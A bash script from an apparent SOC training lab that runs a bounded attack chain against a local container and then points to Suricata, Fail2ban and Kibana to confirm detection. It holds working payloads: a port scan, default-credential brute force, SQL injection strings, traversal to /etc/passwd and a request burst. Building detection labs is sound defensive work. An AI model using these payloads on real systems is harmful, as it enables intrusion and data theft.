#!/bin/bash
# SOC-Lab Attack Script: S7 - Cross-Layer Incident
# Purpose: Correlate bounded events across layers within one local trust zone

set -euo pipefail

# Resolve the repository copy when run from source and the read-only mounted
# copy when run in the attack container. No external command runs before the
# target profile is validated.
ATTACK_SCRIPT_PATH="${BASH_SOURCE[0]}"
ATTACK_SCRIPT_DIR="${ATTACK_SCRIPT_PATH%/*}"
if [[ "$ATTACK_SCRIPT_DIR" == "$ATTACK_SCRIPT_PATH" ]]; then
    ATTACK_SCRIPT_DIR=.
fi
if [[ -r "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh" ]]; then
    source "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh"
elif [[ "$ATTACK_SCRIPT_DIR" == "/scripts" && -r "/secure-learn-target-guard.sh" ]]; then
    source "/secure-learn-target-guard.sh"
else
    echo "ERROR: Secure Learn target guard is unavailable." >&2
    exit 64
fi
secure_learn_validate_target

# Configuration
TARGET="${TARGET:-app}"
TARGET_IP="${TARGET_IP:-172.23.0.20}"
TARGET_PORT="${TARGET_PORT:-3000}"
OUTPUT_DIR="/results"
DELAY="${DELAY:-5}"

secure_learn_validate_bounded_decimal DELAY "$DELAY" 0 10

echo "============================================"
echo "SOC-Lab Scenario S7: Cross-Layer Incident"
echo "Bounded Event Chain Demonstration"
echo "============================================"
echo ""
echo "Target: $TARGET ($TARGET_IP:$TARGET_PORT)"
echo "Delay between phases: ${DELAY}s"
echo "Start Time: $(date -Iseconds)"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"
REPORT_FILE="$OUTPUT_DIR/s7_lateral_$(date +%Y%m%d_%H%M%S).md"

# Start report
cat > "$REPORT_FILE" << EOF
# S7 Event Chain Report

## Overview
- **Start Time**: $(date -Iseconds)
- **Target**: $TARGET ($TARGET_IP:$TARGET_PORT)
- **Attacker IP**: $(hostname -I | awk '{print $1}')

## Event Timeline

> These observations share a local target and time window. They do not by
> themselves prove that one event caused another.

EOF

echo "============================================"
echo "Phase 1: Reconnaissance (S1)"
echo "============================================"
echo ""
echo "Performing port scan..."
echo "" >> "$REPORT_FILE"
echo "### Phase 1: Reconnaissance" >> "$REPORT_FILE"
echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Quick port scan
nmap -sS -p 22,80,3000,5432,9200 --open "$TARGET_IP" 2>/dev/null | tee -a "$REPORT_FILE"
scan_exit=$?

echo ""
echo "Scan command exited with status $scan_exit; inspect its output before drawing conclusions."
echo "**Command exit**: $scan_exit (inspect captured output)" >> "$REPORT_FILE"
echo "Waiting ${DELAY}s before next phase..."
sleep "$DELAY"

echo ""
echo "============================================"
echo "Phase 2: Service Enumeration"
echo "============================================"
echo ""
echo "Enumerating services on port 3000..."
echo "" >> "$REPORT_FILE"
echo "### Phase 2: Service Enumeration" >> "$REPORT_FILE"
echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Check what service is running
curl -s -I -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" 2>/dev/null | head -10 | tee -a "$REPORT_FILE"

echo ""
echo "Waiting ${DELAY}s before next phase..."
sleep "$DELAY"

echo ""
echo "============================================"
echo "Phase 3: Auth Attempts (S2)"
echo "============================================"
echo ""
echo "Attempting brute force attack on login..."
echo "" >> "$REPORT_FILE"
echo "### Phase 3: Auth Attempts" >> "$REPORT_FILE"
echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Exercise inputs remain internal; neither usernames nor secret values are
# written to stdout or the report because evidence only needs status/outcome.
credentials=(
    "admin:admin"
    "user:user"
    "guest:guest"
)

auth_observation="No HTTP 200 observed"
attempt_number=0
for cred in "${credentials[@]}"; do
    ((attempt_number += 1))
    user="${cred%%:*}"
    pass="${cred#*:}"
    
    response=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/auth/login" \
        -H "Host: $TARGET" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$user\",\"password\":\"$pass\"}" \
        -w "\nHTTP_CODE:%{http_code}")
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    
    echo "Auth attempt $attempt_number - HTTP $http_code"
    echo "- Attempt $attempt_number - HTTP $http_code" >> "$REPORT_FILE"
    
    if [ "$http_code" = "200" ]; then
        echo "  HTTP 200 observed; input values withheld"
        auth_observation="HTTP 200 observed on attempt $attempt_number; input values withheld"
        echo "**Observed outcome**: HTTP 200 on attempt $attempt_number; input values withheld" >> "$REPORT_FILE"
        break
    fi
done

echo ""
echo "Waiting ${DELAY}s before next phase..."
sleep "$DELAY"

echo ""
echo "============================================"
echo "Phase 4: SQL Injection (S3)"
echo "============================================"
echo ""
echo "Attempting SQL injection..."
echo "" >> "$REPORT_FILE"
echo "### Phase 4: SQL Injection" >> "$REPORT_FILE"
echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# SQLi payloads
sqli_payloads=(
    "1 OR 1=1"
    "1' OR '1'='1"
    "1 UNION SELECT * FROM users--"
)

for payload in "${sqli_payloads[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    echo "Trying SQLi: $payload"
    echo "- Payload: \`$payload\`" >> "$REPORT_FILE"
    
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/users?id=$encoded" 2>/dev/null)
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    echo "  Response: HTTP $http_code"
    echo "  - Response: HTTP $http_code" >> "$REPORT_FILE"
done

echo ""
echo "Waiting ${DELAY}s before next phase..."
sleep "$DELAY"

echo ""
echo "============================================"
echo "Phase 5: Path Traversal Attempt"
echo "============================================"
echo ""
echo "Attempting path traversal..."
echo "" >> "$REPORT_FILE"
echo "### Phase 5: Path Traversal" >> "$REPORT_FILE"
echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# Path traversal payloads
traversal_payloads=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)

for payload in "${traversal_payloads[@]}"; do
    echo "Trying: $payload"
    echo "- Payload: \`$payload\`" >> "$REPORT_FILE"
    
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/files/$payload" 2>/dev/null)
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    echo "  Response: HTTP $http_code"
    echo "  - Response: HTTP $http_code" >> "$REPORT_FILE"
done

echo ""
echo "Waiting ${DELAY}s before next phase..."
sleep "$DELAY"

echo ""
echo "============================================"
echo "Phase 6: High-Rate Requests (S4)"
echo "============================================"
echo ""
echo "Sending high-rate requests..."
echo "" >> "$REPORT_FILE"
echo "### Phase 6: DoS Attempt" >> "$REPORT_FILE"
echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

success=0
rate_limited=0
failed=0

for i in $(seq 1 50); do
    response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" 2>/dev/null || echo "000")
    
    case $response in
        200) ((success += 1)) ;;
        429) ((rate_limited += 1)) ;;
        *) ((failed += 1)) ;;
    esac
done

echo "Results: OK=$success, 429=$rate_limited, Failed=$failed"
echo "- HTTP 200: $success" >> "$REPORT_FILE"
echo "- Rate Limited: $rate_limited" >> "$REPORT_FILE"
echo "- Failed: $failed" >> "$REPORT_FILE"

echo ""
echo "============================================"
echo "Event Chain Attempts Finished"
echo "============================================"
echo ""
echo "End Time: $(date -Iseconds)" >> "$REPORT_FILE"

# Summary
cat >> "$REPORT_FILE" << EOF

## Summary

| Phase | Event Type | Observation |
|-------|-------------|--------|
| 1 | Port Scan | Command exit=$scan_exit; inspect output |
| 2 | Service Enumeration | Attempted; inspect captured headers |
| 3 | Auth Attempts | $auth_observation |
| 4 | SQL Injection | Attempted |
| 5 | Path Traversal | Attempted |
| 6 | Bounded Request Burst | HTTP 200=$success, HTTP 429=$rate_limited, other=$failed |

## Detection Points

Check the following for detection evidence:

1. **Suricata**
   \`\`\`bash
   docker exec soc-lab-suricata cat /var/log/suricata/fast.log
   \`\`\`

2. **Fail2ban**
   \`\`\`bash
   docker exec soc-lab-fail2ban fail2ban-client status
   \`\`\`

3. **Application Logs**
   \`\`\`bash
   docker exec soc-lab-app cat /var/log/app/auth.log
   docker exec soc-lab-app cat /var/log/app/error.log
   \`\`\`

4. **Kibana**
   - Query: \`source.ip:<attacker_ip>\`
   - Dashboard: Attack-Timeline
EOF

echo ""
echo "Report saved: $REPORT_FILE"
echo ""
echo "============================================"
echo "Detection Verification"
echo "============================================"
echo ""
echo "Run the following commands to verify detection:"
echo ""
echo "1. Check Suricata alerts:"
echo "   docker exec soc-lab-suricata cat /var/log/suricata/fast.log | tail -30"
echo ""
echo "2. Check Fail2ban status:"
echo "   docker exec soc-lab-fail2ban fail2ban-client status"
echo ""
echo "3. Check application logs:"
echo "   docker exec soc-lab-app cat /var/log/app/auth.log | tail -20"
echo ""
echo "4. Open Kibana:"
echo "   http://localhost:5601"
echo "   Query: source.ip:<your_ip>"
echo ""
echo "Verification still required:"
echo "  [ ] Multiple detection sources were triggered"
echo "  [ ] Events are indexed and correlatable by source.ip"
echo "  [ ] MTTD/MTTR can be calculated from recorded timestamps"
echo "  [ ] Any claimed relationship is supported by evidence, not timing alone"
echo "Run on the host: scripts/scenario_e2e_check.sh S7"
